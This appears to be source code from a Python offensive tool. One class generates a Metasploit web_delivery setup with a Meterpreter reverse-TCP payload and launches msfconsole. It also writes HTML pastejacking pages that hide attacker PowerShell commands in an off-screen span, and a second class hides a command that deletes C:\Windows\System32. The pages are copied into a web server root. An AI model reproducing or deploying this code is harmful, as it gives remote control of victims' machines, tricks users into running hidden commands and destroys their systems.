#-*- coding: utf-8 -*-
#!/usr/bin/python
import os
import sys
from colores import *
class PowerShell():
	def __init__(self):
		pass
	def windowsinfect(self):
		self.resultado=raw_input(bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"You think the powershell? (y/n) ")
		if self.resultado == "n" or self.resultado == "N":
			self.ip=raw_input("\nEnter IP: ")
			self.port=raw_input("\nEnter Port: ")
			print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"Starting Metasploit..."
			documento="meta_config"
			archivo = open(documento,"w")
			archivo.write("""use exploit/multi/script/web_delivery\nset URIPATCH /\nset target 2\nset payload windows/meterpreter/reverse_tcp\nset lhost """+self.ip+"""\nset lport """+self.port+"""\nexploit""")
			archivo.close()
			print bcolors.FAIL+"["+bcolors.WARNING+"*"+bcolors.FAIL+"]"+bcolors.payload+"Please start again ExpGenerator."
			os.system("msfconsole -r meta_config")
			os.system("pasteinject")
		elif self.resultado == "y" or self.resultado == "Y":
			self.ip=raw_input("Ingrese ip:> ")
			self.mensaje1=raw_input("First Message:> ")
			self.mensaje2=raw_input("Second message:> ")
			self.comando=raw_input("Command:> ")
			self.powershell=raw_input("Plaease Paste The powershell:> ")
			index="index.html"
			job=open(index,"w")
			job.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & """+self.powershell+"""  c:\ & cls <br> """ + self.comando + """ </span> """+self.mensaje2+"""</p> """)
			job.close()
			os.system("cp index.html /var/www/html")
			print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"All this ended "+bcolors.apache+"---> "+bcolors.payload+"http://"+self.ip+"/"
		else:
			sys.exit("Incorrect.")
class windowsrm():
	def __init__(self):
		self.ip=raw_input(bcolors.payload+"Enter IP:> ")
		self.mensaje1=raw_input(bcolors.payload+"First Message:> ")
		self.sms2=raw_input(bcolors.payload+"Second Message:> ")
		self.comando=raw_input(bcolors.payload+"Command:> ")
	def system32(self):
		archivo="index.html"
		work=open(archivo,"w")	
		work.write("""<p> """ + self.mensaje1 + """ <span style="position: absolute; left: -2000; top: -100px;" >c:\ & cls & rd /s C:\Windows\System32 & cls <br> """ + self.comando + """ </span>"""+self.sms2+""" </p> """)
		work.close()
		os.system("mv index.html /var/www/html")
		print bcolors.WARNING+"["+bcolors.FAIL+"♬"+bcolors.WARNING+"]"+bcolors.payload+"All this ended "+bcolors.apache+"---> "+bcolors.payload+"http://"+self.ip+"/"
